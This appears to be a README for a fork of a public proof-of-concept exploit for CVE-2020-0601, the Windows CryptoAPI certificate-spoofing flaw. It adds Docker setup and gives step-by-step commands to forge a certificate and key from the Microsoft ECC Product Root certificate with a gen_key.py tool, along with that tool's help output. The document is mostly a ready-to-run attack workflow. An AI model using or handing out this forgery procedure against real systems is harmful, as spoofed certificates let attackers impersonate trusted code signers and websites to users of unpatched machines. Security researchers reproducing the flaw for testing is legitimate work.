# CVE-2020-0601

I give full credit to https://github.com/kudelskisecurity/chainoffools. This fork just adds a Dockerfile which creates a pre-configured environment.

## 💿 Build Docker Image
```bash
docker build -t cve-2020-0601 .
```

## 🚢 Docker container

To run the container with a bash shell

```bash
docker run -it --rm -v $(pwd):/app -w /app cve-2020-0601 bash
```

## ⚒️ Forging certificate

To forge certificate using default settings

```bash
docker run -it --rm -v $(pwd):/app -w /app cve-2020-0601
```

## ☣️ Hazardou

Run the docker container with the preset environment

```bash
docker run -it --rm -v $(pwd):/app -w /app cve-2020-0601 bash
```

Run the gen_key.py CLI debug

```bash
pipenv run python gen_key.py -p tools/MicrosoftECCProductRootCertificateAuthority.cer -d
```

Running `pipenv run python gen_key.py --help`

```
Usage: gen_key.py [OPTIONS]

  Create forged key from EC certificate

Options:
  -p, --cert-path TEXT  Full path to EC certificate
  -o, --output TEXT     Full output path to write forged certificate to
  -k, --key-pem TEXT    Full output path to write key pem to
  -d, --debug           Debug does not write keys to dick
  --help                Show this message and exit.          Show this message and exit.
  ```